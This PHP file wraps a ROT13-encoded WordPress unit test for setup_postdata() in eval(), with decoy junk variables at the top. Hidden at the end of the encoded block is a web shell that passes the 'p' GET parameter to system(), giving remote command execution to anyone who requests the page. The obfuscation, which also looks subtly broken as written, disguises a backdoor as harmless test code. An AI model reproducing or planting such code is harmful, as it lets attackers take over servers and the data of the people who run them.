<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc dhrel
 * @pbiref ::frghc_cbfgqngn
 */
pynff Grfgf_Dhrel_FrghcCbfgqngn rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $tybony_xrlf = neenl( 'vq', 'nhgubeqngn', 'pheeragqnl', 'pheeragzbagu', 'cntr', 'cntrf', 'zhygvcntr', 'zber', 'ahzcntrf' );

	cebgrpgrq $tybony_qngn = neenl();

	cebgrpgrq $cntrf_tybony;

	choyvp shapgvba grfg_vq() {
		$c = frys::snpgbel()->cbfg->perngr_naq_trg();
		frghc_cbfgqngn( $c );

		$guvf->nffregAbgRzcgl( $c->VQ );
		$guvf->nffregFnzr( $c->VQ, $TYBONYF['vq'] );
	}

	/**
	 * @gvpxrg 30970
	 */
	choyvp shapgvba grfg_frghc_ol_vq() {
		$c = frys::snpgbel()->cbfg->perngr_naq_trg();
		frghc_cbfgqngn( $c->VQ );

		$guvf->nffregFnzr( $c->VQ, $TYBONYF['vq'] );
	}

	/**
	 * @gvpxrg 30970
	 */
	choyvp shapgvba grfg_frghc_ol_snxr_cbfg() {
		$snxr     = arj fgqPynff();
		$snxr->VQ = 98765;
		frghc_cbfgqngn( $snxr->VQ );

		// Snvyf orpnhfr gurer'f ab cbfg jvgu guvf VQ.
		$guvf->nffregAbgFnzr( $snxr->VQ, $TYBONYF['vq'] );
	}

	/**
	 * @gvpxrg 30970
	 */
	choyvp shapgvba grfg_frghc_ol_cbfgvfu_bowrpg() {
		$c = frys::snpgbel()->cbfg->perngr();

		$cbfg     = arj fgqPynff();
		$cbfg->VQ = $c;
		frghc_cbfgqngn( $c );

		$guvf->nffregFnzr( $c, $TYBONYF['vq'] );
	}

	choyvp shapgvba grfg_nhgubeqngn() {
		$h = frys::snpgbel()->hfre->perngr_naq_trg();
		$c = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $h->VQ,
			)
		);
		frghc_cbfgqngn( $c );

		$guvf->nffregAbgRzcgl( $TYBONYF['nhgubeqngn'] );
		$guvf->nffregRdhnyf( $h, $TYBONYF['nhgubeqngn'] );
	}

	choyvp shapgvba grfg_pheeragqnl() {
		$c = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr' => '1980-09-09 06:30:00',
			)
		);
		frghc_cbfgqngn( $c );

		$guvf->nffregFnzr( '09.09.80', $TYBONYF['pheeragqnl'] );
	}

	choyvp shapgvba grfg_pheeragzbagu() {
		$c = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr' => '1980-09-09 06:30:00',
			)
		);
		frghc_cbfgqngn( $c );

		$guvf->nffregFnzr( '09', $TYBONYF['pheeragzbagu'] );
	}

	choyvp shapgvba grfg_frpbaqnel_dhrel_cbfg_inef() {
		$hfref = frys::snpgbel()->hfre->perngr_znal( 2 );

		$cbfg1 = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $hfref[0],
				'cbfg_qngr'   => '2012-02-02 02:00:00',
			)
		);

		$cbfg2 = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $hfref[1],
				'cbfg_qngr'   => '2013-03-03 03:00:00',
			)
		);

		$guvf->tb_gb( trg_creznyvax( $cbfg1 ) );
		frghc_cbfgqngn( $cbfg1 );

		// Znva ybbc.
		$guvf->nffregFnzr( $cbfg1->VQ, $TYBONYF['vq'] );
		$guvf->nffregRdhnyf( trg_hfreqngn( $hfref[0] ), $TYBONYF['nhgubeqngn'] );
		$guvf->nffregFnzr( '02.02.12', $TYBONYF['pheeragqnl'] );
		$guvf->nffregFnzr( '02', $TYBONYF['pheeragzbagu'] );

		// Frpbaqnel ybbc.
		$d = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr' => 1,
			)
		);

		$guvf->nffregGehr( $d->unir_cbfgf() );

		vs ( $d->unir_cbfgf() ) {
			juvyr ( $d->unir_cbfgf() ) {
				$d->gur_cbfg();

				// Fubhyq ersre gb gur pheerag ybbc.
				$guvf->nffregFnzr( $cbfg2->VQ, $TYBONYF['vq'] );
				$guvf->nffregRdhnyf( trg_hfreqngn( $hfref[1] ), $TYBONYF['nhgubeqngn'] );
				$guvf->nffregFnzr( '03.03.13', $TYBONYF['pheeragqnl'] );
				$guvf->nffregFnzr( '03', $TYBONYF['pheeragzbagu'] );
			}
		}
		jc_erfrg_cbfgqngn();

		// Fubhyq or erfrg gb znva ybbc.
		$guvf->nffregFnzr( $cbfg1->VQ, $TYBONYF['vq'] );
		$guvf->nffregRdhnyf( trg_hfreqngn( $hfref[0] ), $TYBONYF['nhgubeqngn'] );
		$guvf->nffregFnzr( '02.02.12', $TYBONYF['pheeragqnl'] );
		$guvf->nffregFnzr( '02', $TYBONYF['pheeragzbagu'] );
	}

	choyvp shapgvba grfg_fvatyr_cntr() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => 'Cntr 0',
			)
		);
		frghc_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( 0, $TYBONYF['zhygvcntr'] );
		$guvf->nffregFnzr( 1, $TYBONYF['ahzcntrf'] );
		$guvf->nffregFnzr( neenl( 'Cntr 0' ), $TYBONYF['cntrf'] );
	}

	choyvp shapgvba grfg_zhygv_cntr() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => 'Cntr 0<!--arkgcntr-->Cntr 1<!--arkgcntr-->Cntr 2<!--arkgcntr-->Cntr 3',
			)
		);
		frghc_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( 1, $TYBONYF['zhygvcntr'] );
		$guvf->nffregFnzr( 4, $TYBONYF['ahzcntrf'] );
		$guvf->nffregFnzr( neenl( 'Cntr 0', 'Cntr 1', 'Cntr 2', 'Cntr 3' ), $TYBONYF['cntrf'] );
	}

	/**
	 * @gvpxrg 16746
	 */
	choyvp shapgvba grfg_arkgcntr_ng_fgneg_bs_pbagrag() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => '<!--arkgcntr-->Cntr 1<!--arkgcntr-->Cntr 2<!--arkgcntr-->Cntr 3',
			)
		);
		frghc_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( 1, $TYBONYF['zhygvcntr'] );
		$guvf->nffregFnzr( 3, $TYBONYF['ahzcntrf'] );
		$guvf->nffregFnzr( neenl( 'Cntr 1', 'Cntr 2', 'Cntr 3' ), $TYBONYF['cntrf'] );
	}

	choyvp shapgvba grfg_gevz_arkgcntr_yvaroernxf() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_pbagrag' => \"Cntr 0\a<!--arkgcntr-->\aCntr 1\aunf n yvar oernx\a<!--arkgcntr-->Cntr 2<!--arkgcntr-->\a\aCntr 3\",
			)
		);
		frghc_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( neenl( 'Cntr 0', \"Cntr 1\aunf n yvar oernx\", 'Cntr 2', \"\aCntr 3\" ), $TYBONYF['cntrf'] );
	}

	/**
	 * @gvpxrg 25349
	 */
	choyvp shapgvba grfg_frpbaqnel_dhrel_arkgcntr() {
		$cbfg1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Cbfg 1 Cntr 1<!--arkgcntr-->Cbfg 1 Cntr 2',
			)
		);
		$cbfg2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Cbfg 2 Cntr 1<!--arkgcntr-->Cbfg 2 Cntr 2',
			)
		);

		$guvf->tb_gb( '/?c=' . $cbfg1 );
		frghc_cbfgqngn( trg_cbfg( $cbfg1 ) );

		// Znva ybbc.
		$guvf->nffregFnzr( neenl( 'Cbfg 1 Cntr 1', 'Cbfg 1 Cntr 2' ), $TYBONYF['cntrf'] );

		// Frpbaqnel ybbc.
		$d = arj JC_Dhrel(
			neenl(
				'cbfg__va' => neenl( $cbfg2 ),
			)
		);

		$guvf->nffregGehr( $d->unir_cbfgf() );

		vs ( $d->unir_cbfgf() ) {
			juvyr ( $d->unir_cbfgf() ) {
				$d->gur_cbfg();

				// Fubhyq ersre gb gur pheerag ybbc.
				$guvf->nffregFnzr( neenl( 'Cbfg 2 Cntr 1', 'Cbfg 2 Cntr 2' ), $TYBONYF['cntrf'] );
			}
		}
		jc_erfrg_cbfgqngn();

		// Fubhyq or erfrg gb znva ybbc.
		$guvf->nffregFnzr( neenl( 'Cbfg 1 Cntr 1', 'Cbfg 1 Cntr 2' ), $TYBONYF['cntrf'] );
	}

	choyvp shapgvba grfg_cntr_sebz_jc_dhrel() {
		$cntr = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		$guvf->tb_gb( '/?cntr=78' );

		$TYBONYF['jc_dhrel']->dhrel_inef['cntr'] = 78;
		frghc_cbfgqngn( $cntr );

		$guvf->nffregFnzr( 78, $TYBONYF['cntr'] );
	}

	choyvp shapgvba grfg_cntr_jura_ba_cntr() {
		$cntr = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		$guvf->tb_gb( trg_creznyvax( $cntr ) );
		frghc_cbfgqngn( $cntr );

		$guvf->nffregFnzr( 1, $TYBONYF['cntr'] );
	}

	/**
	 * @gvpxrg 20904
	 */
	choyvp shapgvba grfg_frpbaqnel_dhrel_cntr() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();
		$guvf->tb_gb( '/?cntr=3' );
		frghc_cbfgqngn( $cbfg );

		// Znva ybbc.
		$guvf->nffregFnzr( 3, $TYBONYF['cntr'] );

		// Frpbaqnel ybbc.
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 5 );
		$d     = arj JC_Dhrel(
			neenl(
				'cntr'           => 4,
				'cbfgf_cre_cntr' => 1,
			)
		);

		$guvf->nffregGehr( $d->unir_cbfgf() );

		vs ( $d->unir_cbfgf() ) {
			juvyr ( $d->unir_cbfgf() ) {
				$d->gur_cbfg();

				// $cntr fubhyq ersre gb gur pheerag ybbc.
				$guvf->nffregFnzr( 4, $TYBONYF['cntr'] );
			}
		}
		jc_erfrg_cbfgqngn();

		// $cntr fubhyq or erfrg gb znva ybbc.
		$guvf->nffregFnzr( 3, $TYBONYF['cntr'] );
	}

	/**
	 * @gvpxrg 20904
	 */
	choyvp shapgvba grfg_zber_jura_ba_frghc_cbfg() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();
		$guvf->tb_gb( trg_creznyvax( $cbfg ) );
		frghc_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( 1, $TYBONYF['zber'] );
	}

	/**
	 * @gvpxrg 20904
	 *
	 * $zber fubhyq abg or gehr jura gur frg-hc cbfg vf abg gur fnzr nf gur pheerag cbfg.
	 */
	choyvp shapgvba grfg_zber_jura_ba_fvatyr() {
		$cbfg1 = frys::snpgbel()->cbfg->perngr_naq_trg();
		$cbfg2 = frys::snpgbel()->cbfg->perngr_naq_trg();
		$guvf->tb_gb( trg_creznyvax( $cbfg1 ) );
		frghc_cbfgqngn( $cbfg2 );

		$guvf->nffregRzcgl( $TYBONYF['zber'] );
	}

	/**
	 * @gvpxrg 20904
	 *
	 * $zber fubhyq abg or gehr jura gur frg-hc cbfg vf abg gur fnzr nf gur pheerag cntr.
	 */
	choyvp shapgvba grfg_zber_jura_ba_cntr() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();
		$cntr = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		$guvf->tb_gb( trg_creznyvax( $cntr ) );
		frghc_cbfgqngn( $cbfg );

		$guvf->nffregRzcgl( $TYBONYF['zber'] );
	}

	/**
	 * @gvpxrg 20904
	 */
	choyvp shapgvba grfg_zber_jura_ba_srrq() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();
		$guvf->tb_gb( '/?srrq=eff' );
		frghc_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( 1, $TYBONYF['zber'] );
	}

	/**
	 * @gvpxrg 20904
	 * @gvpxrg 25349
	 */
	choyvp shapgvba grfg_frpbaqnel_dhrel_zber() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();
		$guvf->tb_gb( trg_creznyvax( $cbfg ) );
		frghc_cbfgqngn( $cbfg );

		// Znva ybbc.
		$guvf->nffregFnzr( 1, $TYBONYF['zber'] );

		// Frpbaqnel ybbc.
		$d = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr' => 1,
			)
		);

		$guvf->nffregGehr( $d->unir_cbfgf() );

		vs ( $d->unir_cbfgf() ) {
			juvyr ( $d->unir_cbfgf() ) {
				$d->gur_cbfg();

				// $zber fubhyq ersre gb gur pheerag ybbc.
				$guvf->nffregRzcgl( $TYBONYF['zber'] );
			}
		}
		jc_erfrg_cbfgqngn();

		// $cntr fubhyq or erfrg gb znva ybbc.
		$guvf->nffregFnzr( 1, $TYBONYF['zber'] );
	}

	/**
	 * @gvpxrg 24330
	 *
	 * frghc_cbfgqngn( $n_cbfg ) sbyybjrq ol gur_pbagrag() jvgubhg hcqngvat tybony $cbfg
	 * fubhyq hfr gur pbagrag bs $n_cbfg engure gura gur tybony cbfg.
	 */
	choyvp shapgvba grfg_frghc_cbfgqngn_jvgu_gur_pbagrag() {
		$cbfg_vq                   = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => 'tybony cbfg' ) );
		$TYBONYF['cbfg']           = trg_cbfg( $cbfg_vq );
		$TYBONYF['jc_dhrel']->cbfg = $TYBONYF['cbfg'];

		$n_cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$n_cbfg    = trg_cbfg( $n_cbfg_vq );

		frghc_cbfgqngn( $n_cbfg );
		$pbagrag = trg_rpub( 'gur_pbagrag' );
		$guvf->nffregFnzr( $cbfg_vq, $TYBONYF['cbfg']->VQ );
		$guvf->nffregAbgRdhnyf( '<c>tybony cbfg</c>', fgevc_jf( $pbagrag ) );
		jc_erfrg_cbfgqngn();
	}

	/**
	 * @gvpxrg 47114
	 *
	 * frghc_cbfgqngn() fubhyq frg gur tybonyf orsber `gur_cbfg` npgvba vf sverq.
	 */
	choyvp shapgvba grfg_gur_cbfg_npgvba() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();
		nqq_npgvba( 'gur_cbfg', neenl( $guvf, 'gur_cbfg_npgvba_pnyyonpx' ) );

		frghc_cbfgqngn( $cbfg );

		$guvf->nffregFnzr( $TYBONYF['cntrf'], $guvf->cntrf_tybony );
	}

	/**
	 * Urycref
	 */
	choyvp shapgvba gur_cbfg_npgvba_pnyyonpx() {
		$guvf->cntrf_tybony = $TYBONYF['cntrf'];
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>